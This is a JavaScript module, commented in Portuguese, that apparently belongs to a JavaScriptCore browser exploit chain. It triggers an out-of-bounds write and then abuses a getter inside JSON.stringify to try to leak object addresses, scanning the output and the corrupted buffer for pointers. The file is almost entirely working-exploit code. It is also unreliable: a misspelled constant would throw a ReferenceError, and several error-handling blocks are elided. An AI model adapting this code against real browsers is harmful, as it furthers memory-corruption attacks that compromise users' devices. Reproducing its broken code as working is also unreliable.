// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs'; // Assumindo que stringToAdvancedInt64Array NÃO é mais necessária aqui
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeakV5";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    leaks_in_json_output: [],
    leaks_in_oob_ab: [], // Armazenará {offset, value_hex, note}
    details: ""
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORruption_value_trigger = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN = 0xFEFEFEFE; // Padrão para preencher o oob_ab
const OOB_AB_SNOOP_SIZE = 0x800; // Sondar primeiros 2KB

// Variável de escopo de módulo para o objeto cujo endereço queremos vazar
let object_to_leak_address_ref_global; 

class CheckpointForStringifierLeakV5 {
    constructor(id) {
        this.id_marker = `StrLeakV5Chkpt-${id}`;
        this.prop_for_stringifier_target = null; // Será preenchido com object_to_leak_address_ref_global
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeakV5_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Reset
            success: false, message: "Getter chamado, tentando vazar endereço via Stringifier (v5).",
            error: null, leaks_in_json_output: [], leaks_in_oob_ab: [], details:""
        };
        let details_log_getter = [];
        let leak_found_flag = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB ou oob_ab não disponíveis no getter.");
            }

            // 1. Preencher oob_array_buffer_real com um padrão
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            logS3(`DENTRO DO GETTER: Preenchendo oob_ab de 0 a ${toHex(fill_limit)} com ${toHex(OOB_AB_FILL_PATTERN)}...`, "info", FNAME_GETTER);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e_fill) {}
            }
            details_log_getter.push(`oob_ab preenchido com padrão.`);

            // 2. Usar o object_to_leak_address_ref_global (já criado no runner) no objeto de stress
            if (!object_to_leak_address_ref_global) {
                details_log_getter.push("ERRO GETTER: object_to_leak_address_ref_global não definido!");
                throw new Error("Objeto alvo global para leak não definido no getter.");
            }
            
            // O objeto 'this' (instância de CheckpointForStringifierLeakV5) já tem this.prop_for_stringifier_target = object_to_leak_address_ref_global
            // Vamos criar um objeto de stress adicional que também o referencie, para dar mais trabalho ao Stringifier.
            let stress_obj_internal = {
                id: "StressInterno",
                deep_target_ref: object_to_leak_address_ref_global,
                long_string_data: "X".repeat(200) + object_to_leak_address_ref_global.unique_marker_id + "Y".repeat(200),
                nested_array: [1,2,3, { sub_target: object_to_leak_address_ref_global }, 5]
            };
            details_log_getter.push(`Objeto de stress interno criado, referenciando target (ID: ${object_to_leak_address_ref_global.unique_marker_id}).`);

            // 3. Chamar JSON.stringify internamente
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre stress_obj_internal...", "subtest", FNAME_GETTER);
            let internal_json_output_str = "";
            try {
                internal_json_output_str = JSON.stringify(stress_obj_internal);
                details_log_getter.push(`Stringify interno completado. Output length: ${internal_json_output_str.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno output (primeiros 300 chars): ${internal_json_output_str.substring(0, 300)}...`, "info", FNAME_GETTER);

                // 3a. Procurar por ponteiros no output string JSON
                const hex_ptr_regex_getter = /0x[0-9a-fA-F]{7,16}/g; // Ajustado para pegar ponteiros um pouco menores também
                let matches_in_json = internal_json_output_str.match(hex_ptr_regex_getter);
                if (matches_in_json) {
                    details_log_getter.push(`Potenciais ponteiros encontrados na string JSON interna: ${matches_in_json.join(', ')}`);
                    logS3(`POTENCIAIS PONTEIROS NA STRING JSON INTERNA: ${matches_in_json.join(', ')}`, "leak", FNAME_GETTER);
                    current_test_results.leaks_in_json_output = matches_in_json;
                    leak_found_flag = true;
                }
            } catch (e_json_int) { /* ... (tratamento de erro como antes) ... */ }
            
            // 4. Sondar o oob_array_buffer_real por escritas/vazamentos
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações/ponteiros...", "info", FNAME_GETTER);
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) { /* ... (lógica de sondagem como antes, usando OOB_AB_FILL_PATTERN) ... */
                let skip_offset = false;
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) {
                     skip_offset = true; 
                     try {
                        const val_trig_u32 = oob_read_absolute(offset, 4);
                        if (val_trig_u32 !== OOB_AB_FILL_PATTERN) {
                             current_test_results.leaks_in_oob_ab.push({offset: toHex(offset), value: toHex(val_trig_u32), note: "Trigger Area"});
                        }
                     } catch(e){}
                }
                if(skip_offset) continue;
                try {
                    const value_u32_check = oob_read_absolute(offset, 4);
                    if (value_u32_check !== OOB_AB_FILL_PATTERN) {
                        const val64_check = oob_read_absolute(offset, 8);
                        const leak_info_oob = `ALTERAÇÃO oob_data[${toHex(offset)}] = ${val64_check.toString(true)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN)})`;
                        logS3(leak_info_oob, "leak", FNAME_GETTER);
                        current_test_results.leaks_in_oob_ab.push({offset: toHex(offset), value_hex: val64_check.toString(true), note: "Data Overwritten"});
                        leak_found_flag = true;
                        if ((val64_check.high() > 0x0001 && val64_check.high() < 0x8000) && (val64_check.low() !== 0 || val64_check.high() !== 0)) {
                            logS3(`  -> VALOR ALTAMENTE SUSPEITO DE PONTEIRO (oob_ab)!`, "vuln", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop) {}
            }
             if (current_test_results.leaks_in_oob_ab.filter(l => l.note === "Data Overwritten").length > 0) {
                details_log_getter.push(`${current_test_results.leaks_in_oob_ab.filter(l => l.note === "Data Overwritten").length} DWORDS alterados (não padrão) encontrados.`);
            }


            if (leak_found_flag) {
                current_test_results.success = true;
                current_test_results.message = "Potencial vazamento de informação detectado (na string JSON ou no oob_ab)!";
            } else {
                current_test_results.message = "Nenhum vazamento óbvio detectado ao estressar Stringifier com objeto alvo.";
            }
            current_test_results.details = details_log_getter.join('; ');

        } catch (e_getter_main) { /* ... (tratamento de erro como antes) ... */ }
        return { "getter_processed_stringifier_addrof_v5": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeakV5.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { 
            id: this.id_marker, 
            prop_being_stringified: this.prop_for_stringifier_target, // Serializar a propriedade alvo
            processed_by_str_leak_v5_test: true 
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierAddrOfLeakTestRunnerV5";
    logS3(`--- Iniciando Teste de AddrOf via Stringifier Corrompido (v5) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };
    object_to_leak_address_ref_global = null; 

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Criar o objeto alvo global ANTES do gatilho
        object_to_leak_address_ref_global = { "unique_marker_id": 0xFEEDFACE + Math.floor(Math.random()*0xFFF) };
        logS3(`Objeto alvo global para addrof criado: ID=${toHex(object_to_leak_address_ref_global.unique_marker_id)}`, "info", FNAME_TEST_RUNNER);

        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierLeakV5(1);
        checkpoint_obj.prop_for_stringifier_target = object_to_leak_address_ref_global; // Atribuir aqui
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}, prop_for_stringifier_target preenchida.`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output_runner = "";
        try {
            final_json_output_runner = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado (parcial): ${final_json_output_runner.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
            
            // Verificar se o output JSON EXTERNO contém algum vazamento (menos provável, mas para consistência)
            const hex_ptr_regex_runner = /0x[0-9a-fA-F]{7,16}/g;
            let matches_in_runner_json = final_json_output_runner.match(hex_ptr_regex_runner);
            if (matches_in_runner_json && current_test_results && !current_test_results.success) {
                current_test_results.success = true;
                current_test_results.message = (current_test_results.message || "") + ` String JSON EXTERNA continha formato de ponteiro: ${matches_in_runner_json.join(',')}`;
                 logS3(`String JSON EXTERNA continha formato de ponteiro: ${matches_in_runner_json.join(',')}`, "vuln", FNAME_TEST_RUNNER);
            }

        } catch (e_json_ext) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ADDR_OF STRINGIFIER (v5): SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ADDR_OF STRINGIFIER (v5): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaks_in_json_output && current_test_results.leaks_in_json_output.length > 0) {
            logS3("--- Potenciais Ponteiros na String JSON Interna (do Getter) ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_json_output.forEach(ptr_str => {
                logS3(`  ${ptr_str}`, "leak", FNAME_TEST_RUNNER);
            });
        }
        if (current_test_results.leaks_in_oob_ab && current_test_results.leaks_in_oob_ab.length > 0) {
            logS3("--- Potenciais Ponteiros/Alterações no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    object_to_leak_address_ref_global = null;
    logS3(`--- Teste de AddrOf via Stringifier Corrompido (v5) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
